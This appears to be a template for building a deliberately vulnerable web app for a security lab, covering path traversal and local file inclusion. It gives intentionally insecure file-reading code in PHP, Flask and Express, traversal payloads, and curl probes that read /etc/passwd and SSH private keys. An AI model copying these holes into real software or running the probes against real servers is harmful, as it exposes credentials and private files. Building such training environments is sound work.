---
id: path_traversal_lfi
type: web_vulnerability
description: A path traversal / local file inclusion vulnerability where user-controlled input is used to construct a file path without sanitization, allowing an attacker to read arbitrary files on the server.
required_vars: []
---
# Atom: Path Traversal / Local File Inclusion

User input is used directly to construct a filesystem path that is then read and returned in the HTTP response. An attacker uses `../` sequences to escape the intended base directory and read sensitive files such as `/etc/passwd`, SSH private keys, application config files, or credential stores.

### Logic Requirements:
1. A GET parameter (or POST field) controls which file is read.
2. The file path is constructed by joining a base directory with the user input without sanitizing `../` sequences.
3. The file contents are read and returned in the response.
4. No `realpath()` check or prefix validation is performed.

### Synthesis Guidance:
The cover story is a file viewer or download endpoint — a log viewer, a document preview, a help page reader, or a static resource loader. The user supplies a filename or relative path, and the app reads that file from a base directory.

The interesting target files for an attack chain are: `/etc/passwd` (enumerate users), `/home/<username>/.bash_history` (find credentials), `/home/<username>/.ssh/id_rsa` (steal SSH key), or application config files containing database credentials.

**PHP (Apache — file_get_contents):**
```php
$file = $_GET['page'];
$content = file_get_contents("/var/www/html/pages/" . $file);
echo $content;
```
Traversal: `?page=../../../../etc/passwd`
Or with PHP include (true LFI): `include("/var/www/html/pages/" . $file);`

**Python / Flask (open):**
```python
filename = request.args.get('file', 'index.txt')
filepath = os.path.join(BASE_DIR, filename)
with open(filepath) as f:
    return f.read()
```
Traversal: `?file=../../../../etc/passwd`
Note: `os.path.join` with an absolute path component resets the base — use string concatenation for the vulnerable pattern, or `os.path.normpath` without a realpath check.

**Node.js / Express (fs.readFile):**
```js
const file = req.query.file;
const filePath = path.join(__dirname, 'pages', file);
fs.readFile(filePath, 'utf8', (err, data) => {
    res.send(data);
});
```
Traversal: `?file=../../../../etc/passwd`
Note: `path.join` normalises `../` but does NOT prevent escaping the base dir. A `path.resolve` check against the base dir would be the fix.

### Testing Guidance:
**Layer 1 — Internal state check:**
Verify that the traversal payload reads a file outside the intended directory:
```bash
curl -s "http://localhost/app?file=../../../../etc/passwd" | grep "root:"
```
The response must contain the `/etc/passwd` contents, confirming the traversal works.

**Layer 2 — External attack probe (from attacker container):**
```bash
# Read /etc/passwd to enumerate users
curl -s "http://target/app?file=../../../../etc/passwd" | grep "root:"

# Attempt to read an SSH private key or credentials file
curl -s "http://target/app?file=../../../../home/<username>/.ssh/id_rsa" | grep "BEGIN"
```
A successful result shows file contents that are outside the intended webroot, confirming arbitrary file read.
